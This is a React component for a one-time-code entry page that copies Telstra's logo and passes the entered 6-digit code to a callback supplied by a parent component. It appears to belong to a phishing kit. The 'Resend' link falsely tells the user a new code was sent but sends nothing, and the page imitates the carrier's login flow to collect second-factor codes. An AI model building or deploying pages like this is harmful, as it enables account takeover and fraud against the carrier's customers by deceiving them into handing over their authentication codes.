import React, { useState, useEffect } from 'react';

const OtpPage = ({ onOtpSubmit, onBack, setLoading, username }) => {
  const [otpCode, setOtpCode] = useState('');
  const [error, setError] = useState('');
  const [timeLeft, setTimeLeft] = useState(300); // 5 minutes in seconds

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prevTime) => {
        if (prevTime <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prevTime - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${String(minutes).padStart(2, '0')}:${String(remainingSeconds).padStart(2, '0')}`;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    const isValid = /^\d{6}$/.test(otpCode.trim());
    
    if (!isValid) {
      setError('Invalid code. Please enter a 6-digit number.');
      return;
    }

    setLoading(true);
    setError('');

    try {
      await onOtpSubmit(otpCode.trim());
    } catch (error) {
      setError('An error occurred. Please try again.');
      setLoading(false);
    }
  };

  const handleResend = (e) => {
    e.preventDefault();
    alert("A new code has been sent to your device.");
    setTimeLeft(300); // Reset timer
  };

  return (
    <div className="page active">
      <div className="page-header">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 33 33" aria-label="Telstra Logo" style={{width: '36px', height: 'auto', marginLeft: '100px'}}>
          <path d="M18.743 14.083L17.5 21.35c-.26 1.31-1.12 1.66-1.88 1.66H9.88L12.3 9.7C9.88 8.6 7.42 7.88 5.46 7.88 3.6 7.88 2.08 8.38 1.07 9.59.36 10.45 0 11.51 0 12.77c0 3.78 2.98 9.03 8.08 13.32 4.55 3.78 9.55 5.91 13.19 5.91 1.82 0 3.28-.56 4.25-1.66.76-.86 1.06-1.97 1.06-3.23 0-3.68-3-8.84-7.84-13.02z" fill="#F96449"/>
          <path d="M8.44 0c-.91 0-1.67.61-1.87 1.57L5.76 5.95h7.21L9.88 23.01h5.74c.77 0 1.63-.36 1.88-1.66l2.63-15.4h5.19c.91 0 1.67-.6 1.87-1.56L28 0H8.44z" fill="#0D54FF"/>
        </svg>
      </div>
      
      <div className="otp-container">
        <h2>Enter Code</h2>
        <form onSubmit={handleSubmit}>
          <label htmlFor="otp">6-digit code</label>
          <p>Please enter the code sent to your phone number to continue.</p>
          <input 
            type="text" 
            name="otp" 
            id="otp" 
            maxLength="6" 
            required
            value={otpCode}
            onChange={(e) => setOtpCode(e.target.value)}
            disabled={timeLeft <= 0}
          />
          {error && (
            <div className="otp-error show">
              {error}
            </div>
          )}

          <div className="countdown">
            {timeLeft > 0 ? `Code will expire in ${formatTime(timeLeft)}` : 'Code expired.'}
          </div>

          <div className="resend-block">
            Didn't get your one-time code?<br /><p>&nbsp;</p>
            <a href="#" onClick={handleResend}>Resend</a>
          </div>

          <div className="nav-buttons">
            <button type="button" onClick={onBack}>← Back</button>
            <button type="submit" className="next-btn" disabled={timeLeft <= 0}>Next</button>
          </div>
        </form>
      </div>
    </div>
  );
};

export default OtpPage;
